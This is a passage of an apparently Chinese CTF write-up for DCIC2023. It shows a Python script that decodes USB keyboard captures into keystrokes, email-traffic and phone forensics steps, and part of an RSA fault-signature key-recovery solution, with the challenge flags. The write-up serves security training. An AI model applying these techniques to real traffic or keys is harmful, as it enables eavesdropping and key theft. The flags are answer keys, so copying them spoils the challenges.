class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>FLAG：flag{9a0cfbde-1e41-4024-9f80-a1570c0a93f8}</p><h3 id="bankmail-1"><a href="#bankmail-1" class="headerlink" title="bankmail.1"></a>bankmail.1</h3><p><img src="/mdimg/DCIC2023/1.png"><br><img src="/mdimg/DCIC2023/2.png"><br>转md5就是flag</p><h3 id="bankmail-3"><a href="#bankmail-3" class="headerlink" title="bankmail.3"></a>bankmail.3</h3><p>wireshark中字符串直接搜索flag，可以定位到343流量包中有flag内容的字符画，解读后md5提交</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Content-Type: text/plain; charset=&quot;us-ascii&quot;<br><br>MIME-Version: 1.0<br><br>Content-Transfer-Encoding: 7bit<br><br>From: flag@bank.com<br><br>To: get<span class="hljs-emphasis">_flag@bank.com</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">Subject: About attachment</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"><span class="hljs-strong">____</span>_</span>.__                    <span class="hljs-strong">___     .__</span>_           .<span class="hljs-strong">___ __</span><span class="hljs-strong">___  __</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>   .<span class="hljs-strong">___  .__</span>_        <span class="hljs-strong">____</span><span class="hljs-strong">__<span class="hljs-emphasis">_.      _</span>__</span><span class="hljs-strong">___  __</span>__             <span class="hljs-strong">____</span>_   <span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>__  <span class="hljs-strong">____</span>         <span class="hljs-strong">__<span class="hljs-emphasis">_.          _</span>__</span><span class="hljs-strong">____</span>_  <span class="hljs-strong">____</span><span class="hljs-strong">____</span>                  <span class="hljs-strong">____</span>_   .<span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">___   .__</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">__.      __</span><span class="hljs-strong">____</span>  <span class="hljs-strong">____</span><span class="hljs-strong">____</span>         <span class="hljs-strong">___</span><br><span class="hljs-strong"><span class="hljs-emphasis">_/ _</span>__</span><span class="hljs-emphasis">_\  | <span class="hljs-strong">____</span>_</span>     <span class="hljs-strong">____</span>   / /    <span class="hljs-strong">__| <span class="hljs-emphasis">_/_</span>__</span>_     <span class="hljs-strong">__| <span class="hljs-emphasis">_// _</span>__</span><span class="hljs-emphasis">_\/ <span class="hljs-strong">____</span>\<span class="hljs-strong">____</span>_</span>_  \<span class="hljs-strong">__| <span class="hljs-emphasis">_/_</span><span class="hljs-emphasis">_| _</span>/       /_   \_ |__</span>   /  __  \/_   |           /  |  |<span class="hljs-emphasis">_/ <span class="hljs-strong">____</span>\<span class="hljs-strong">____</span>_</span>_  \/_   |        \_ |__   <span class="hljs-strong">____</span>/   __   \/   __   \         <span class="hljs-strong">____</span>_ <span class="hljs-emphasis">_/ <span class="hljs-strong">____</span>\<span class="hljs-strong">__| _/   __</span>   \<span class="hljs-strong">____</span>_</span>  \  |   <span class="hljs-strong">____</span>/\<span class="hljs-strong">____</span>__  \<span class="hljs-strong">____</span>_  \_ |__   /  __  \ \<span class="hljs-strong">____</span>_  \ <span class="hljs-strong">____</span>    \ \<br>\   <span class="hljs-strong">__\|  | \__</span>  \   / <span class="hljs-strong">__<span class="hljs-emphasis">_\  \ \   / _</span>_ |\__</span>  \   / __ |\   <span class="hljs-strong">__\   __</span>\     /    / __ |/ __ |  <span class="hljs-strong">____</span>__ |   || __ \  &gt;      &lt; |   |  <span class="hljs-strong">____</span>__  /   |  |\   <span class="hljs-strong">__\    /    / |   |  __</span><span class="hljs-strong">____</span> | __ \<span class="hljs-emphasis">_/ <span class="hljs-strong">___\__</span>_</span>_    /\<span class="hljs-strong">____</span>    /  <span class="hljs-strong">____</span>__  \__  \   <span class="hljs-strong">__\/ __</span> |\<span class="hljs-strong">____</span>    //  <span class="hljs-strong">____</span>/  |<span class="hljs-strong">____</span>  \     /    //  <span class="hljs-strong">____</span>/| __ \  &gt;      &lt;  /  <span class="hljs-strong">____</span>// __ \   / /<br>|  |  |  |<span class="hljs-strong">__/ __</span> \<span class="hljs-emphasis">_/ /_</span>/  &gt; &lt; &lt;  / /<span class="hljs-emphasis">_/ | / _</span>_ \<span class="hljs-emphasis">_/ /_</span>/ | |  |   |  |     /    / /<span class="hljs-emphasis">_/ / /_</span>/ | /<span class="hljs-strong">____</span><span class="hljs-emphasis">_/ |   || \_</span>\ \/   --   \|   | /<span class="hljs-strong">____</span><span class="hljs-emphasis">_/ /    ^   /|  |     /    /  |   | /<span class="hljs-strong">____</span>_</span>/ | \<span class="hljs-emphasis">_\ \  \<span class="hljs-strong">___  /    /    /    /  /__</span><span class="hljs-strong">___/  / __</span> \|  | / /_</span>/ |   /    //       \  /       \   /    //       \| \<span class="hljs-emphasis">_\ \/   --   \/       \  <span class="hljs-strong">___/   &gt; &gt;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">|__</span>|  |<span class="hljs-strong">____</span>(<span class="hljs-strong">____</span>  /\<span class="hljs-strong">___  /  / /  \__</span>_</span>_ |(<span class="hljs-strong">____</span>  /\<span class="hljs-strong">____</span> | |<span class="hljs-strong">__|   |__</span>|    /<span class="hljs-strong">____</span>/\<span class="hljs-strong">____</span> \<span class="hljs-strong">____</span> |         |<span class="hljs-strong">__<span class="hljs-emphasis">_||_</span>__</span>  /\<span class="hljs-strong">____</span>__  /|<span class="hljs-strong">__<span class="hljs-emphasis">_|         \_</span>__</span>_   | |<span class="hljs-strong">__|    /__</span><span class="hljs-strong">__/   |__</span><span class="hljs-emphasis">_|         |<span class="hljs-strong">___  /\__</span>_</span>  &gt;/<span class="hljs-strong">____</span>/    /<span class="hljs-strong">____</span>/           (<span class="hljs-strong">____</span>  /<span class="hljs-strong">__| \__</span>__ |  /<span class="hljs-strong">____</span>/ \<span class="hljs-strong">____</span><span class="hljs-strong">___ \/__</span><span class="hljs-strong">____</span>  /  /<span class="hljs-strong">____</span>/ \<span class="hljs-strong">____</span><span class="hljs-strong">___ \__</span>_  /\<span class="hljs-strong">____</span>__  /\<span class="hljs-strong">____</span><span class="hljs-strong">___ \__</span>_  &gt;  \ \<br>\//<span class="hljs-strong">____</span><span class="hljs-emphasis">_/   \_</span>\_      \/     \/      \/                           \/    \/                  \/        \/                    |<span class="hljs-strong">__|                                    \/     \/                                 \/          \/                 \/       \/                  \/   \/        \/         \/   \/  <span class="hljs-emphasis">_/_</span>/ </span><br><span class="hljs-strong"></span><br><span class="hljs-strong">.</span><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(md5(b&#x27;flag&#123;dadff7dd-<span class="hljs-number">1b81</span>-4f71-bc99-afd92572b82e&#125;&#x27;).hexdigest())<br># 286efb6773c5164950b9d5c3f7e532a0<br></code></pre></td></tr></table></figure><h3 id="Bad-Hole-4"><a href="#Bad-Hole-4" class="headerlink" title="Bad Hole.4"></a>Bad Hole.4</h3><p>火眼一把梭<br><img src="/mdimg/DCIC2023/3.png"></p><h3 id="Bad-Hole-5"><a href="#Bad-Hole-5" class="headerlink" title="Bad Hole.5"></a>Bad Hole.5</h3><p>火眼查看到删除了一个联系人  查看源文件数据库文件<br><img src="/mdimg/DCIC2023/4.png"><br>然后火眼爆搜73b0ff56<br><img src="/mdimg/DCIC2023/5.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ddddhm"><a href="#ddddhm" class="headerlink" title="ddddhm"></a>ddddhm</h3><p>msg_fault_sigs在签名时对私钥d的指定bit进行反转，通过sige=m(1±e*2^i)即可泄露私钥d的对应bit<br>总计泄露了私钥的低位约600bit，已经大于因子p的位数，因此在2^ldbit上求解模二次方程即可直接恢复素因子p的值，进而恢复flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">129796898134024157099156452709058687368221438176030502692200747714575571701027659861801365516981802018997712595009646737912670988500232545577601552315965176230630625733276337162755295073834150653688782811860047196091202071789102378530279205691266477048001888471022116120453815115157747843722970514365474705361</span><br>c = <span class="hljs-number">28155862534483900756503838301143450769414409086099843418769499162080414954518936609807127271806747358186614224609572255012947222354262187016982365705086277162984908253967918708855654630031832484605376292561975959073350547470232906500885973352162337117221695274031310918815529052585532897653072326669404499493</span><br>msg_sig = <span class="hljs-number">45588026639453540614209700278011089411155941366441867967608269376572773649222458505929678835171063978513562524842704550251413928579096289510261727050687647392547776693337400122310176000901151825994980601875289096262412881003000600445821033469228193081998689326645879888998639588132546327028023877114420047558</span><br>msg_fault_sigs = [<span class="hljs-number">113429466458778166644945767044415219042772717711254210322408597644274935171586002639342195758927583523229418327742308160439436895947957916864974638414396996801138175706945050212053508048541944739154964054236306140695812079245294637992314314009077833980161139452215919584864468588483718514462559681775014326409</span>, <span class="hljs-number">43031327270677359985165098362153992403225916428513696699868627765069327549237937934695595834240328330202611385474456604601598542380630113614252881630542199784148104030099903791570261962274498319184265204085272313501262887880172928633212848923149245422898668043490940653356408677953426546478861682254129323983</span>, <span class="hljs-number">966885667599357848348022756340223470262834430902002911613346396218154732271788115784781054266116465195738724025001053091234425896133820096656703611182129434753967986644268247815971904312163692200435738141158444390017732398874565101978877704795576194382410849789372802334687877562834782648487521419962746341</span>, <span class="hljs-number">22270699014092817640381954131819343667553097426486241765114449687913398530890503374656780997871854668679268985145078734255944086281783801986912641877362606093848503649367031903880451127827073135591045234912284308284644450952832361847583497332116449851039433354824022630315650748533096834295101914438252231215</span>, <span class="hljs-number">66120332261266549719253133409961606599558961974400336039136718650963882870300747871413945146771940655357510038008903944342948091572538276991145159822448882977050437002867958905666394952065266853318158990277616193696588690739418996149899024975132132397930556406409512489321942778877975114649963358299831295772</span>, <span class="hljs-number">47507350138153905038078310411817061191139135891760281620215507261123306999391954691774213865603014291633448636096423340318029665161703501568151685444302034900177473362154173266650305220215717485332561732173424079139254556182303786106398395676129627454825040021576800755458735970462468787276384909114928464011</span>, <span class="hljs-number">54399341278003958310498119783426456680200300676394082381259796993720652442499394218761883152787939096761348837587724912720946004995745534168673568867534537159198059551869413473459447524715003367857938435866283229509993525532914875798141093438183446623329044682094085026675610324926193294680595215134822452992</span>, <span class="hljs-number">96372429581066959639274430290926637932604963820580711092951366751121170758841563506161198822743948143979079892278755647263883375276751270285043799960081953519385167794953696630621545257947196107934027904954299261296604021082713283177711700146839734283278440169721710359355251410029841619556589215882022281743</span>, <span class="hljs-number">108536653382041420195830120134181635389581983996230588564065817293668077198810870779637445594235513825538378650157585409941880324662110506967565370906656477459495748877118089491906299715612303931977207518447524180619589746622263838862877121147916191126290740764150244497178740577706793430933414852955843580759</span>, <span class="hljs-number">115536860989602214120850141469595339293699937187420773748756608420330461211739404825747345529316980832123680191867689174639627897225947905653276767700242627626506007433714208818095210892516140096869679053514081602618203874106581153212549309009582749538808803725100939972852124359613485629614141464406572224725</span>, <span 